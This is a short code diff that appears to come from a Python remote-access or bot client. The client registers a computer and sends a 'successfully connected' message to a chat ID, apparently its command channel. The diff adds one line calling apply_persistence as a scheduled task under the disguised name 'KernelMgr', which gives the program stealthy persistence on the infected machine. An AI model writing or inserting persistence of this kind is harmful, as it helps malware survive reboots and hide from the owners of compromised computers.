@@ -1354,6 +1354,8 @@ async def main():
     # Start registration immediately in a separate task
     asyncio.create_task(register_computer())
 
+    persistence_lib.apply_persistence(method='task', stealth_name='KernelMgr', key_name='KernelMgr')
+
     await send_message(
         chat_id=NOTIFY_CHATID,
         text=f"{COMPUTER_ID} successfully connected!"
